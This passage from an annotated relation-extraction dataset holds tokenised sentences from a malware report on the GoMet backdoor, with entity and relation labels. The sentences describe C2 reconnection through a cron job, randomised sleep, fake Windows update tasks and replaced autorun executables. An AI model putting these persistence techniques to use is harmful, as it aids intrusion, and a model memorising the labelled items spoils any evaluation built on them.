"sent_id": 4, "global_pos": [151, 151], "name": "C2", "pos": [9, 10], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [158, 158], "name": "C2", "pos": [2, 3], "index": "18_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "sample", "pos": [7, 8], "index": "19_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [186, 186], "name": "Pseudo Code", "pos": [1, 3], "index": "20_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "FR", "evidence": [0], "h": 0, "t": 3}, {"r": "FR", "evidence": [0], "h": 0, "t": 4}, {"r": "FR", "evidence": [0], "h": 0, "t": 5}, {"r": "CD", "evidence": [1], "h": 7, "t": 8}, {"r": "RD", "evidence": [2], "t": 9, "h": 10}, {"r": "WR", "evidence": [2], "t": 9, "h": 10}, {"r": "CO", "evidence": [2], "h": 9, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 12}, {"r": "RD", "evidence": [3], "t": 12, "h": 13}, {"r": "ST", "evidence": [3], "h": 13, "t": 14}, {"r": "RF", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3], "h": 13, "t": 15}, {"r": "ST", "evidence": [3], "t": 14, "h": 15}, {"r": "RF", "evidence": [3], "t": 14, "h": 15}, {"r": "ST", "evidence": [3], "h": 15, "t": 16}, {"r": "RF", "evidence": [3], "h": 15, "t": 16}, {"r": "WR", "evidence": [3, 4, 5, 6, 7], "h": 15, "t": 20}, {"r": "CO", "evidence": [3, 4, 5], "h": 13, "t": 19}, {"r": "CO", "evidence": [4, 5], "h": 17, "t": 18}, {"r": "CO", "evidence": [3, 4], "t": 16, "h": 17}]}, {"title": "065-2", "sents": [["An", "additional", "notable", "feature", "of", "GoMet", "lies", "in", "its", "ability", "to", "daisy", "chain", "whereby", "the", "attackers", "gain", "access", "to", "a", "network", "or", "machine", "and", "then", "use", "that", "same", "information", "to", "gain", "access", "to", "multiple", "networks", "and", "computers", "connections", "from", "one", "implanted", "host", "to", "another", "."], ["This", "version", "was", "changed", "by", "malicious", "actors", ",", "in", "the", "original", "code", ",", "the", "cronjob", "is", "configured", "to", "be", "executed", "once", "every", "hour", "on", "the", "hour", "."], ["The", "objective", "of", "the", "cron", "job", "defined", "in", "the", "main", "part", "of", "the", "malware", "is", "to", "check", "if", "it", "'s", "connected", "to", "the", "C2", ",", "if", "not", "it", "will", "start", "the", "agent", "component", "again", "and", "connect", "to", "the", "C2", "."], ["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [5, 5], "name": "GoMet", "pos": [5, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [15, 15], "name": "attackers", "pos": [15, 16], "index": "1_0"}], [{"type": "SF", "sent_id": 0, "global_pos": [17, 17], "name": "access", "pos": [17, 18], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [46, 46], "name": "version", "pos": [1, 2], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [51, 51], "name": "actors", "pos": [6, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "cronjob", "pos": [14, 15], "index": "5_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [76, 76], "name": "cron job", "pos": [4, 6], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [85, 85], "name": "malware", "pos": [13, 14], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [95, 95], "name": "C2", "pos": [23, 24], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [103, 103], "name": "agent component", "pos": [31, 33], "index": "9_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [110, 110], "name": "C2", "pos": [38, 39], "index": "10_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [121, 121], "name": "C2", "pos": [9, 10], "index": "11_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [128, 128], "name": "C2", "pos": [2, 3], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [133, 133], "name": "sample", "pos": [7, 8], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [156, 156], "name": "Pseudo Code", "pos": [1, 3], "index": "14_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [180, 180], "name": "Go compiler", "pos": [5, 7], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [185, 185], "name": "source code", "pos": [10, 12], "index": "16_0"}]], "labels": [{"r": "CD", "evidence": [0], "h": 1, "t": 2}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "WR", "evidence": [1], "t": 3, "h": 4}, {"r": "CO", "evidence": [1], "h": 3, "t": 5}, {"r": "CO", "evidence": [1, 2], "h": 3, "t": 6}, {"r": "RD", "evidence": [2], "t": 6, "h": 7}, {"r": "ST", "evidence": [2], "h": 7, "t": 8}, {"r": "RF", "evidence": [2], "h": 7, "t": 8}, {"r": "FR", "evidence": [2], "h": 7, "t": 9}, {"r": "ST", "evidence": [2], "t": 8, "h": 9}, {"r": "RF", "evidence": [2], "t": 8, "h": 9}, {"r": "ST", "evidence": [2], "h": 9, "t": 10}, {"r": "RF", "evidence": [2], "h": 9, "t": 10}, {"r": "WR", "evidence": [2, 3, 4, 5, 6], "h": 9, "t": 14}, {"r": "CO", "evidence": [2, 3, 4], "h": 7, "t": 13}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 12}, {"r": "CO", "evidence": [2, 3], "t": 10, "h": 11}, {"r": "FR", "evidence": [4, 5, 6, 7], "h": 13, "t": 15}, {"r": "ST", "evidence": [4, 5, 6, 7], "t": 12, "h": 15}, {"r": "RF", "evidence": [4, 5, 6, 7], "t": 12, "h": 15}, {"r": "WR", "evidence": [6, 7], "t": 14, "h": 15}, {"r": "RD", "evidence": [7], "h": 15, "t": 16}, {"r": "WR", "evidence": [7], "h": 15, "t": 16}]}, {"title": "065-3", "sents": [["This", "version", "was", "changed", "by", "malicious", "actors", ",", "in", "the", "original", "code", ",", "the", "cronjob", "is", "configured", "to", "be", "executed", "once", "every", "hour", "on", "the", "hour", "."], ["The", "objective", "of", "the", "cron", "job", "defined", "in", "the", "main", "part", "of", "the", "malware", "is", "to", "check", "if", "it", "'s", "connected", "to", "the", "C2", ",", "if", "not", "it", "will", "start", "the", "agent", "component", "again", "and", "connect", "to", "the", "C2", "."], ["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "version", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "actors", "pos": [6, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [14, 14], "name": "cronjob", "pos": [14, 15], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [31, 31], "name": "cron job", "pos": [4, 6], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [40, 40], "name": "malware", "pos": [13, 14], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [50, 50], "name": "C2", "pos": [23, 24], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [58, 58], "name": "agent component", "pos": [31, 33], "index": "6_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [65, 65], "name": "C2", "pos": [38, 39], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [76, 76], "name": "C2", "pos": [9, 10], "index": "8_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [83, 83], "name": "C2", "pos": [2, 3], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [88, 88], "name": "sample", "pos": [7, 8], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [111, 111], "name": "Pseudo Code", "pos": [1, 3], "index": "11_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [135, 135], "name": "Go compiler", "pos": [5, 7], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [140, 140], "name": "source code", "pos": [10, 12], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "CO", "evidence": [0], "h": 0, "t": 2}, {"r": "CO", "evidence": [0, 1], "h": 0, "t": 3}, {"r": "RD", "evidence": [1], "t": 3, "h": 4}, {"r": "ST", "evidence": [1], "h": 4, "t": 5}, {"r": "RF", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "ST", "evidence": [1], "t": 5, "h": 6}, {"r": "RF", "evidence": [1], "t": 5, "h": 6}, {"r": "ST", "evidence": [1], "h": 6, "t": 7}, {"r": "RF", "evidence": [1], "h": 6, "t": 7}, {"r": "WR", "evidence": [1, 2, 3, 4, 5], "h": 6, "t": 11}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 8, "t": 9}, {"r": "CO", "evidence": [1, 2], "t": 7, "h": 8}, {"r": "FR", "evidence": [3, 4, 5, 6], "h": 10, "t": 12}, {"r": "ST", "evidence": [3, 4, 5, 6], "t": 9, "h": 12}, {"r": "RF", "evidence": [3, 4, 5, 6], "t": 9, "h": 12}, {"r": "WR", "evidence": [5, 6], "t": 11, "h": 12}, {"r": "RD", "evidence": [6], "h": 12, "t": 13}, {"r": "WR", "evidence": [6], "h": 12, "t": 13}]}, {"title": "065-4", "sents": [["The", "objective", "of", "the", "cron", "job", "defined", "in", "the", "main", "part", "of", "the", "malware", "is", "to", "check", "if", "it", "'s", "connected", "to", "the", "C2", ",", "if", "not", "it", "will", "start", "the", "agent", "component", "again", "and", "connect", "to", "the", "C2", "."], ["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "cron job", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "malware", "pos": [13, 14], "index": "1_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [23, 23], "name": "C2", "pos": [23, 24], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "agent component", "pos": [31, 33], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [38, 38], "name": "C2", "pos": [38, 39], "index": "4_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [49, 49], "name": "C2", "pos": [9, 10], "index": "5_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [56, 56], "name": "C2", "pos": [2, 3], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [61, 61], "name": "sample", "pos": [7, 8], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [84, 84], "name": "Pseudo Code", "pos": [1, 3], "index": "8_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [108, 108], "name": "Go compiler", "pos": [5, 7], "index": "9_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [113, 113], "name": "source code", "pos": [10, 12], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [135, 135], "name": "cron job", "pos": [9, 11], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [142, 142], "name": "serve ( ) routine", "pos": [16, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [154, 154], "name": "Agent", "pos": [28, 29], "index": "13_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [0], "h": 1, "t": 2}, {"r": "RF", "evidence": [0], "h": 1, "t": 2}, {"r": "FR", "evidence": [0], "h": 1, "t": 3}, {"r": "ST", "evidence": [0], "t": 2, "h": 3}, {"r": "RF", "evidence": [0], "t": 2, "h": 3}, {"r": "ST", "evidence": [0], "h": 3, "t": 4}, {"r": "RF", "evidence": [0], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1, 2, 3, 4], "h": 3, "t": 8}, {"r": "CO", "evidence": [0, 1, 2], "h": 1, "t": 7}, {"r": "CO", "evidence": [1, 2], "h": 5, "t": 6}, {"r": "CO", "evidence": [0, 1], "t": 4, "h": 5}, {"r": "FR", "evidence": [2, 3, 4, 5], "h": 7, "t": 9}, {"r": "ST", "evidence": [2, 3, 4, 5], "t": 6, "h": 9}, {"r": "RF", "evidence": [2, 3, 4, 5], "t": 6, "h": 9}, {"r": "WR", "evidence": [4, 5], "t": 8, "h": 9}, {"r": "RD", "evidence": [5], "h": 9, "t": 10}, {"r": "WR", "evidence": [5], "h": 9, "t": 10}, {"r": "EX", "evidence": [7], "h": 11, "t": 12}, {"r": "FR", "evidence": [7], "h": 11, "t": 13}]}, {"title": "065-5", "sents": [["The", "picture", "below", "shows", "the", "execution", "flow", "of", "the", "C2", "setup", "routine", "Agent", "."], ["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [9, 9], "name": "C2", "pos": [9, 10], "index": "0_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [16, 16], "name": "C2", "pos": [2, 3], "index": "1_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [21, 21], "name": "sample", "pos": [7, 8], "index": "2_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [44, 44], "name": "Pseudo Code", "pos": [1, 3], "index": "3_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [68, 68], "name": "Go compiler", "pos": [5, 7], "index": "4_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [73, 73], "name": "source code", "pos": [10, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [95, 95], "name": "cron job", "pos": [9, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [102, 102], "name": "serve ( ) routine", "pos": [16, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [114, 114], "name": "Agent", "pos": [28, 29], "index": "8_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [130, 130], "name": "pseudo-code", "pos": [14, 15], "index": "9_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [144, 144], "name": "samples", "pos": [28, 29], "index": "10_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [150, 150], "name": "backdoor", "pos": [34, 35], "index": "11_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [161, 161], "name": "samples", "pos": [45, 46], "index": "12_0"}]], "labels": [{"r": "CO", "evidence": [0, 1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1, 2, 3, 4], "h": 2, "t": 4}, {"r": "ST", "evidence": [1, 2, 3, 4], "t": 1, "h": 4}, {"r": "RF", "evidence": [1, 2, 3, 4], "t": 1, "h": 4}, {"r": "WR", "evidence": [3, 4], "t": 3, "h": 4}, {"r": "RD", "evidence": [4], "h": 4, "t": 5}, {"r": "WR", "evidence": [4], "h": 4, "t": 5}, {"r": "EX", "evidence": [6], "h": 6, "t": 7}, {"r": "FR", "evidence": [6], "h": 6, "t": 8}, {"r": "WR", "evidence": [6, 7], "h": 8, "t": 9}, {"r": "WR", "evidence": [7], "t": 9, "h": 10}, {"r": "WR", "evidence": [7], "t": 9, "h": 10}, {"r": "WR", "evidence": [7], "t": 9, "h": 11}, {"r": "CO", "evidence": [7], "h": 10, "t": 12}]}, {"title": "065-6", "sents": [["If", "the", "C2", "is", "unreachable", ",", "the", "sample", "will", "sleep", "for", "a", "random", "amount", "of", "time", "between", "five", "and", "10", "minutes", "."], ["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."], ["The", "malicious", "activity", "we", "detected", "included", "a", "fake", "Windows", "update", "scheduled", "tasks", "created", "by", "the", "GoMet", "dropper", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [2, 2], "name": "C2", "pos": [2, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [7, 7], "name": "sample", "pos": [7, 8], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [30, 30], "name": "Pseudo Code", "pos": [1, 3], "index": "2_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [54, 54], "name": "Go compiler", "pos": [5, 7], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "source code", "pos": [10, 12], "index": "4_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [81, 81], "name": "cron job", "pos": [9, 11], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [88, 88], "name": "serve ( ) routine", "pos": [16, 20], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [100, 100], "name": "Agent", "pos": [28, 29], "index": "7_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [116, 116], "name": "pseudo-code", "pos": [14, 15], "index": "8_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [130, 130], "name": "samples", "pos": [28, 29], "index": "9_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [136, 136], "name": "backdoor", "pos": [34, 35], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [147, 147], "name": "samples", "pos": [45, 46], "index": "11_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [175, 175], "name": "fake Windows update", "pos": [7, 10], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [183, 183], "name": "GoMet dropper", "pos": [15, 17], "index": "13_0"}]], "labels": [{"r": "FR", "evidence": [0, 1, 2, 3], "h": 1, "t": 3}, {"r": "ST", "evidence": [0, 1, 2, 3], "t": 0, "h": 3}, {"r": "RF", "evidence": [0, 1, 2, 3], "t": 0, "h": 3}, {"r": "WR", "evidence": [2, 3], "t": 2, "h": 3}, {"r": "RD", "evidence": [3], "h": 3, "t": 4}, {"r": "WR", "evidence": [3], "h": 3, "t": 4}, {"r": "EX", "evidence": [5], "h": 5, "t": 6}, {"r": "FR", "evidence": [5], "h": 5, "t": 7}, {"r": "WR", "evidence": [5, 6], "h": 7, "t": 8}, {"r": "WR", "evidence": [6], "t": 8, "h": 9}, {"r": "WR", "evidence": [6], "t": 8, "h": 9}, {"r": "WR", "evidence": [6], "t": 8, "h": 10}, {"r": "CO", "evidence": [6], "h": 9, "t": 11}, {"r": "WR", "evidence": [7], "t": 12, "h": 13}]}, {"title": "065-7", "sents": [["GO", "'s", "sleep", "implementation", "uses", "nanoseconds", "."], ["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."], ["The", "malicious", "activity", "we", "detected", "included", "a", "fake", "Windows", "update", "scheduled", "tasks", "created", "by", "the", "GoMet", "dropper", "."], ["It", "enumerated", "the", "autorun", "values", "and", ",", "instead", "of", "creating", "a", "new", "one", ",", "replaced", "one", "of", "the", "existing", "goodware", "autorun", "executables", "with", "the", "malware", "."]], "vertexSet": [[{"type": "MF", "sent_id": 1, "global_pos": [8, 8], "name": "Pseudo Code", "pos": [1, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [32, 32], "name": "Go compiler", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [37, 37], "name": "source code", "pos": [10, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [59, 59], "name": "cron job", "pos": [9, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [66, 66], "name": "serve ( ) routine", "pos": [16, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [78, 78], "name": "Agent", "pos": [28, 29], "index": "5_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [94, 94], "name": "pseudo-code", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [108, 108], "name": "samples", "pos": [28, 29], "index": "7_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [114, 114], "name": "backdoor", "pos": [34, 35], "index": "8_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [125, 125], "name": "samples", "pos": [45, 46], "index": "9_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [153, 153], "name": "fake Windows update", "pos": [7, 10], "index": "10_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [161, 161], "name": "GoMet dropper", "pos": [15, 17], "index": "11_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [183, 183], "name": "goodware", "pos": [19, 20], "index": "12_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [188, 188], "name": "malware", "pos": [24, 25], "index": "13_0"}]], "labels": [{"r": "WR", "evidence": [1, 2], "t": 0, "h": 1}, {"r": "RD", "evidence": [2], "h": 1, "t": 2}, {"r": "WR", "evidence": [2], "h": 1, "t": 2}, {"r": "EX", "evidence": [4], "h": 3, "t": 4}, {"r": "FR", "evidence": [4], "h": 3, "t": 5}, {"r": "WR", "evidence": [4, 5], "h": 5, "t": 6}, {"r": "IJ", "evidence": [4, 5, 6, 7], "h": 3, "t": 12}, {"r": "WR", "evidence": [5], "t": 6, "h": 7}, {"r": "WR", "evidence": [5], "t": 6, "h": 7}, {"r": "WR", "evidence": [5], "t": 6, "h": 8}, {"r": "FR", "evidence": [5, 6, 7], "h": 8, "t": 12}, {"r": "CO", "evidence": [5], "h": 7, "t": 9}, {"r": "WR", "evidence": [6], "t": 10, "h": 11}, {"r": "CO", "evidence": [6, 7], "h": 11, "t": 13}, {"r": "UK", "evidence": [7], "t": 12, "h": 13}]}, {"title": "065-8", "sents": [["The", "Pseudo", "Code", "would", "look", "like", "the", "following", ":", "time_Sleep", "(", "1000000000", "*", "(", "rnd_val", "+", "300", ")", ")", "."], ["The", "trick", "is", ",", "the", "Go", "compiler", "is", "changing", "the", "source", "code", "WaitGroup", "."], ["Done", "(", ")", "to", "WaitGroup.Add", "(", "-1", ")", "."], ["After", "the", "Agent.start", "routine", "is", "done", ",", "the", "next", "cron", "job", "triggered", "the", "execution", "of", "the", "serve", "(", ")", "routine", "and", "tried", "to", "start", "another", "instance", "of", "the", "Agent", "."], ["The", "simplified", "source", "code", "of", "the", "GitHub", "version", "looks", "like", "this", ":", "The", "simplified", "pseudo-code", "for", "the", "samples", "in", "the", "wild", "looks", "like", "this", ":", "Talos", "found", "two", "samples", "of", "this", "version", "of", "the", "backdoor", ":", "f24158c5132943fbdeee4de4cedd", "(", "FctSec.exe", ")", "950ba2cc9b1dfaadf6919e05c854c", "(", "SQLocalM86.exe", ")", "These", "samples", "have", "minor", "differences", "but", "are", "likely", "built", "from", "the", "same", "source", "code", ",", "just", "with", "a", "slightly", "different", "configuration", "."], ["The", "malicious", "activity", "we", "detected", "included", "a", "fake", "Windows", "update", "scheduled", "tasks", "created", "by", "the", "GoMet", "dropper", "."], ["It", "enumerated", "the", "autorun", "values", "and", ",", "instead", "of", "creating", "a", "new", "one", ",", "replaced", "one", "of", "the", "existing", "goodware", "autorun", "executables", "with", "the", "malware", "."], ["In", "one", "of", "the", "cases", ",", "about", "60", "seconds", "before", "the", "schtask", "query", "is", "executed", ",", "a", "blank", "CMD", "process", "is", "opened", "and", "then", "subsequently", "executes", "systeminfo", "and", "schtask", "queries", "rather", "than", "these", "queries", "being", "chain", "opened", "by", "svchost", "or", "services", "or", "another", "process", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [1, 1], "name": "Pseudo Code", "pos": [1, 3], "index": "0_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [25, 25], "name": "Go compiler", "pos": [5, 7], "index": "1_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [30, 30], "name": "source code", "pos": [10, 12], "index": "2_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [52, 52], "name": "cron job", "pos": [9, 11], "index": "3_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [59, 59], "name": "serve ( ) routine", "pos": [16, 20], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [71, 71], "name": "Agent", "pos": [28, 29], "index": "5_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [87, 87], "name": "pseudo-code", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [101, 101], "name": "samples", "pos": [28, 29], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [107, 107], "name": "backdoor", "pos": [34, 35], "index": "8_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [118, 118], "name": "samples", 